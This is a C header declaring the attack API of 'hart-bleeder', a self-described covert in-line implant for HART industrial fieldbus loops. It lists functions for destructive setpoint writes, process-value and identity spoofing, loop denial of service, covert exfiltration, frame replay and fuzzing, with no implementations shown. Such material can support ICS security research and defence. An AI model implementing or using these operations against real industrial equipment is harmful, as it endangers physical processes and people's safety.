/*
 * hart-bleeder — attacks.h
 * High-level attack operations for the HART Fieldbus Covert
 * In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#ifndef HART_BLEEDER_ATTACKS_H
#define HART_BLEEDER_ATTACKS_H

#include <stdint.h>
#include "hart_stack.h"
#include "loop_drv.h"

/* ── Attack operation result ─────────────────────────────────── */
typedef enum {
    ATK_OK = 0,
    ATK_NO_DEVICE,
    ATK_TIMEOUT,
    ATK_STATUS_ERR,
    ATK_MODE_REJECT,
    ATK_FAULT,
} atk_result_t;

/* ── API ──────────────────────────────────────────────────────── */

/* Recon: enumerate all field devices on the loop */
int attacks_enumerate(hart_device_t *out, uint8_t max);

/* Read PV (primary variable) from a device */
int attacks_read_pv(uint8_t addr, float *pv_pct, float *pv_ma);

/* Write PV setpoint (control valve / final element) — destructive */
int attacks_write_setpoint(uint8_t addr, float setpoint_pct);

/* Spoof identity: overwrite device tag (cmd 17) */
int attacks_write_tag(uint8_t addr, const char *tag, uint8_t tag_len);

/* Force loop current to arbitrary value (process value spoofing) */
int attacks_spoof_pv(float target_ma);

/* DoS: open the loop (break continuity) */
int attacks_loop_dos(uint32_t duration_ms);

/* DoS: induce voltage sag to crash field device */
int attacks_sag_inject(uint32_t duration_ms, float sag_pct);

/* Covert exfiltration via ±0.5 mA FSK on the loop */
int attacks_covert_exfil(const uint8_t *data, uint16_t len);

/* Covert receive: sample loop current and demodulate FSK covert channel */
int attacks_covert_recv(uint8_t *out, uint16_t max, uint16_t *got,
                        uint32_t timeout_ms);

/* Burst-mode capture: record all HART frames for later analysis */
int attacks_burst_capture(uint32_t duration_ms);

/* Replay a previously captured HART frame */
int attacks_replay_frame(const uint8_t *frame, uint16_t len);

/* Fuzz: send malformed HART frames to probe parser robustness */
int attacks_fuzz(uint8_t addr, uint16_t count);

/* Pretty-print device list to console */
void attacks_print_devices(const hart_device_t *devs, uint8_t n);

#endif /* HART_BLEEDER_ATTACKS_H */